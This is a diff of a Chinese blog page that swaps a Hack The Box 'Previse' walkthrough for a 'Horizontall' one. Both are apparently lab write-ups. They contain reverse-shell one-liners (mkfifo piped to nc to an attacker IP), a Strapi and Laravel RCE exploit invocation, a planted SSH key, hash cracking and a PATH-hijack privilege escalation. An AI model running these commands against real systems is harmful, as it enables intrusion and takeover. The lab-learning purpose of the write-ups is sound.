@@ -18,7 +18,7 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-  <title>Previse - Crush&#39;s Blog</title>
+  <title>Horizontall - Crush&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -175,7 +175,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Previse">
+            <span class="h2" id="subtitle" title="Horizontall">
               
             </span>
 
@@ -185,7 +185,7 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-10-18 14:54" pubdate>
+      <time datetime="2021-10-18 15:37" pubdate>
         2021年10月18日 下午
       </time>
     </span>
@@ -197,7 +197,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      710 字
+      594 字
     </span>
   
 
@@ -207,7 +207,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      10
+      8
        分钟
     </span>
   
@@ -237,100 +237,79 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Previse</h1>
+            <h1 style="display: none">Horizontall</h1>
             
             <div class="markdown-body">
               <hr>
-<pre><code>参考wp：
-https://davidguest.uk/hack-the-box-previse/
-https://hackhouse.net/htb-previse/
+<pre><code>nmap -sS -sC -sV -A -p- 10.10.11.105
 </code></pre>
-<h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d1a942ab3f51d91a35671.jpg" srcset="/img/loading.gif" lazyload></h2><pre><code>老惯例，nmap 
-nmap -v -sSV -p 22,80 -Pn 10.10.11.104 -T4 -oA nmap/sSV 感觉免费的简单靶场都是22 和 80
-</code></pre>
-<p><img src="https://pic.imgdb.cn/item/616d1aca2ab3f51d91a3898a.jpg" srcset="/img/loading.gif" lazyload><br>页面打开是这么个玩意儿<br><img src="https://pic.imgdb.cn/item/616d1aee2ab3f51d91a3aeed.jpg" srcset="/img/loading.gif" lazyload><br>目录扫描没扫出什么东西<br>使用 curl 时，可以从 webapp 获取真正的响应页面，因为 curl 默认不遵循重定向。</p>
+<p>一样的22 和 80 靶场绑定了域名修改etc/hosts文件 </p>
 <hr>
-<pre><code>curl -is -X GET 10.10.11.104/index.php
+<pre><code>echo 10.10.11.105 horizontall.htb &gt;&gt; /etc/hosts
 </code></pre>
-<p>访问一下10.10.11.104/accounts.php </p>
+<p>gobuster啥都没跑出来 这种情况，网站没有啥功能点，但是扫目录也没有可以利用的东西，尝试从接口入手</p>
 <hr>
-<pre><code>curl -is -X http://10.10.11.104/account.php
+<pre><code>jsfinder python3 JSFinder.py -u http://horizontall.htb/
 </code></pre>
-<p><img src="https://pic.imgdb.cn/item/616d1af42ab3f51d91a3b3ce.jpg" srcset="/img/loading.gif" lazyload><br>发现了3个表单，提交数据 并且说了用户名和密码在5-32个字符之间<br><img src="https://pic.imgdb.cn/item/616d1af72ab3f51d91a3b79b.jpg" srcset="/img/loading.gif" lazyload><br>-d POST 发送有参数的 POST 请求<br>用curl提交post请求访问一下 </p>
+<p><img src="https://pic.imgdb.cn/item/616d26652ab3f51d91b02160.jpg" srcset="/img/loading.gif" lazyload><br>同样的接口也写在hosts文件里</p>
 <hr>
-<pre><code>curl -is -X POST -d &quot;username=hacker&amp;password=hacker&amp;confirm=hacker&quot; 10.10.11.104/accounts.php  
+<pre><code>echo 10.10.11.105 api-prod.horizontall.htb &gt;&gt; /etc/hosts
 </code></pre>
-<p>成功登陆。<br><img src="https://pic.imgdb.cn/item/616d1afc2ab3f51d91a3bcde.jpg" srcset="/img/loading.gif" lazyload><br>开始翻网站，翻到一个像是被注入过的一个日志文件<br><img src="https://pic.imgdb.cn/item/616d1b002ab3f51d91a3c109.jpg" srcset="/img/loading.gif" lazyload><br>file目录下有一个上传和一个上传文件的下载 backup，备份，网站备份文件，打开，干他 看备份文件就看config，db，这类的<br><img src="https://pic.imgdb.cn/item/616d1b062ab3f51d91a3c643.jpg" srcset="/img/loading.gif" lazyload><br>解压文件 unzip siteBackup.zip<br><img src="https://pic.imgdb.cn/item/616d1b092ab3f51d91a3c8e1.jpg" srcset="/img/loading.gif" lazyload><br>config.php  是一个数据库配置文件，可以尝试连一下ssh<br><img src="https://pic.imgdb.cn/item/616d1b0d2ab3f51d91a3ccc8.jpg" srcset="/img/loading.gif" lazyload><br>没啥用，继续翻文件logs.php 看到一个exec命令执行的函数<br><img src="https://pic.imgdb.cn/item/616d1b0f2ab3f51d91a3cf92.jpg" srcset="/img/loading.gif" lazyload><br>&amp;&amp; 连接一个反弹shell的命令<br><img src="https://pic.imgdb.cn/item/616d1b122ab3f51d91a3d22e.jpg" srcset="/img/loading.gif" lazyload><br><img src="https://pic.imgdb.cn/item/616d1b172ab3f51d91a3d6af.jpg" srcset="/img/loading.gif" lazyload><br><img src="https://pic.imgdb.cn/item/616d1b1a2ab3f51d91a3d96d.jpg" srcset="/img/loading.gif" lazyload><br>连接成功，是个低权限的 ls 没有要找到的user root flag<br>但是/home/下有一个用户m4lwhere，下面有一个user.txt，需要m4lwhere权限才能访问<br>前面拿到数据库配置的文件，看能不能再数据库里面找到m4lwhere的hash 用hashcat 爆一下<br>构造脚本</p>
+<p>扫接口看有没有东西<br><img src="https://pic.imgdb.cn/item/616d26692ab3f51d91b024b8.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>扫到一个后台，并且是一个cms，然后找下有没有公开的漏洞 </p>
 <hr>
-<pre><code>&lt;?php
-$db = connectDB();
+<pre><code>http://api-prod.horizontall.htb/admin/auth/login
+</code></pre>
+<p>访问目录/admin/strapiVersion可获取strapi的版本号<br><img src="https://pic.imgdb.cn/item/616d266e2ab3f51d91b02b91.jpg" srcset="/img/loading.gif" lazyload><br><img src="https://pic.imgdb.cn/item/616d26722ab3f51d91b02f1f.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>exp-db找到一个exp<br><img src="https://pic.imgdb.cn/item/616d26752ab3f51d91b03217.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>可以重置密码和rce</p>
+<hr>
+<pre><code>nc 10.10.14.7 1234  nc -lvvp 1234  弹是弹了，但是执行不了命令
+</code></pre>
+<hr>
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.7 1234 &gt;/tmp/f
+</code></pre>
+<p><img src="https://pic.imgdb.cn/item/616d26782ab3f51d91b034c0.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>nc -lvvp 1234 弹回来了，能执行了 </p>
+<hr>
+<pre><code>python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; 
+</code></pre>
+<p>在home文件夹下的下一个文件夹找到user.txt<br><img src="https://pic.imgdb.cn/item/616d267c2ab3f51d91b03868.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>上传了一个提权工具linpeas.sh 这个脚本非常厉害，可以枚举linux操作系统几乎所有的可提权项，甚至可以通过su暴力破解本地密码，输出非常多。  第一次用这个工具，好像确实屌，找到一个8000的端口和一个1337端口<br><img src="https://pic.imgdb.cn/item/616d26802ab3f51d91b03c71.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>这个尝试连ssh 但是连不上<br><img src="https://pic.imgdb.cn/item/616d26832ab3f51d91b03e5d.jpg" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<pre><code>de1veloper #J!:F9Zt2u
+</code></pre>
+<p>传个frp访问一下他的8000端口 传了依旧访问不了，明天打，</p>
+<p>ssh-keygen生成一个公钥，传上去，然后连接</p>
+<hr>
+<pre><code>wget 10.10.14.7/id_rsa.pub -O authorized_keys
 
-$query = &quot;SELECT username, password FROM accounts&quot;;
-$users = $db-&gt;query($query);
-
-if ($users-&gt;num_rows &gt; 0) &#123;
-    while($row = mysqli_fetch_assoc($users)) &#123;
-      var_dump($row);
-    &#125;
-  &#125;
-
-$db-&gt;close();
+ssh strapi@10.10.11.105 -i id_rsa
+</code></pre>
+<p>ssh 把8000端口转发出来</p>
+<hr>
+<pre><code>ssh -i id_rsa -L 8000:127.0.0.1:8000 strapi@10.10.11.105
+</code></pre>
+<p>数据库连接进去看一下 有一个strapi表<br><img src="https://pic.imgdb.cn/item/616d26862ab3f51d91b041b4.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>进去看下<br><img src="https://pic.imgdb.cn/item/616d26892ab3f51d91b0456d.jpg" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<pre><code>select * from strapi_administrator; |  3 | admin    | admin@horizontall.htb | $2a$10$7NGi1GoBaGP3Lw3FYAjw9OhXkgqVRpoecHoaXXIwoVhLZx0etorve | NULL               |    NULL |
+</code></pre>
+<p>kali 写个公钥进去 把端口带到本地的8000</p>
+<hr>
+<pre><code>ssh -L 8000:127.0.0.1:8000 strapi@horizontall.htb
+</code></pre>
+<p>127.0.0.1:8000访问不了，不打了，下一位。</p>
+<p>他妈的，访问不了的原因是开了梯子，，，，淦<br><img src="https://pic.imgdb.cn/item/616d268d2ab3f51d91b04999.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>红日7也出现过这玩意儿，直接用exp rce打就行了</p>
+<hr>
+<pre><code>python3 exploit.py http://localhost:8000 Monolog/RCE1 &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.7 2345 &gt;/tmp/f &quot;
 </code></pre>
 <hr>
-<pre><code>echo &#39;&lt;上面的代码&gt;&#39; &gt;&gt; status.php里
+<pre><code>nc -lvvp 2345
 </code></pre>
-<hr>
-<pre><code>curl 10.10.11.104/status.php  访问那个文件，成功读到了他的hash
-</code></pre>
-<h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d1b1f2ab3f51d91a3ddcf.jpg" srcset="/img/loading.gif" lazyload></h2><pre><code>m4lwhere的hash就是
-$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
-</code></pre>
-<hr>
-<pre><code>用john 或者 hashcat跑hash明文
-</code></pre>
-<hr>
-<pre><code>john
-john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long
-</code></pre>
-<h2 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d1b242ab3f51d91a3e262.jpg" srcset="/img/loading.gif" lazyload></h2><pre><code>hashcat
-hashcat hash.txt /usr/share/wordlists/rockyou.txt -m 500
-</code></pre>
-<p><img src="https://pic.imgdb.cn/item/616d1b272ab3f51d91a3e54e.jpg" srcset="/img/loading.gif" lazyload><br>ssh连接拿到第一个user.txt<br><img src="https://pic.imgdb.cn/item/616d1b272ab3f51d91a3e54e.jpg" srcset="/img/loading.gif" lazyload></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><hr>
-<pre><code>sudo -l  看到一个access_backup.sh的root文件
-</code></pre>
-<hr>
-<pre><code>m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
-#!/bin/bash
-
-# We always make sure to store logs, we take security SERIOUSLY here
-
-# I know I shouldnt run this as root but I cant figure it out programmatically on my account
-# This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time
-
-gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_access.gz
-gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_file_access.gz
-</code></pre>
-<hr>
-<pre><code>cd /tmp
-cat &lt;&lt; EOF &gt; gzip
-&gt; #!/bin/bash
-&gt; cp /bin/bash /tmp/c
-&gt; chmod u+s /tmp/c
-&gt; EOF
-chmod +x gzip
-export PATH=$( pwd ):$PATH
-
-sudo /opt/scripts/access_backup.sh
-./c -p
-</code></pre>
-<hr>
-<pre><code>提权不是很懂，这个有点像是环境变量劫持，成功提权
-</code></pre>
-<hr>
-<pre><code>514371f6578495a1ae9624f3a199f944
-</code></pre>
-<p><img src="https://pic.imgdb.cn/item/616d1b302ab3f51d91a3ed10.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>弹回来了<br><img src="https://pic.imgdb.cn/item/616d26902ab3f51d91b04d1a.jpg" srcset="/img/loading.gif" lazyload></p>
 
             </div>
             <hr>
@@ -365,9 +344,9 @@ sudo /opt/scripts/access_backup.sh
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/10/18/Horizontall/">
+                      <a href="/2021/10/18/Driver/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Horizontall</span>
+                        <span class="hidden-mobile">Driver</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -375,8 +354,8 @@ sudo /opt/scripts/access_backup.sh
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/10/18/BountyHunter/">
-                        <span class="hidden-mobile">BountyHunter</span>
+                      <a href="/2021/10/18/Previse/">
+                        <span class="hidden-mobile">Previse</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
